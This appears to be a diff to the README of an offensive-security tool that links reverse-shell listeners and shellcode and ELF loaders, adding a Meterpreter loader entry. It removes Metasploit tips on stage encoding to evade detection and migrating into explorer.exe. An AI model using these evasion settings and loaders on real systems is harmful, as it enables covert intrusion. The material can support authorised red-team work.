@@ -30,24 +30,11 @@ Some advanced templates require manual steps:
 - [Reverse shell listener with Tmux and Socat](./genshell/templates/reverse/listener/tmux-socat-multiplexer/)
 - [Python ELF loader via `memfd_create()` on Linux](./genshell/templates/exec/memfd-create.py)
 - [Python shellcode loader on Linux](./genshell/templates/exec/mmap-ctype.py)
+- [Meterpreter loader for Windows](./genshell/templates/exec/windows-minildr/)
 
 ## Tips
 
-### Metasploit
-
-Payloads like `windows/shell_reverse_tcp` are one of the few reverse shells for Windows that support interactive commands.
-
-Evade basic detections when using Meterpreter.
-After you received the connection run `load stdapi` ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)).
-
-~~~
-set Payload windows/meterpreter/reverse_http
-set EnableStageEncoding true
-set StageEncoder x86/shikata_ga_nai
-set AutoLoadStdapi false
-~~~
-
-When your shell terminates shortly after you receive the connection run `migrate -N explorer.exe` in the meterpreter shell or `set AutoRunScript post/windows/manage/migrate` on the handler.
+Metasploit payloads like `windows/shell_reverse_tcp` are one of the few reverse shells for Windows that support interactive commands.
 
 ### Linux PTY
 
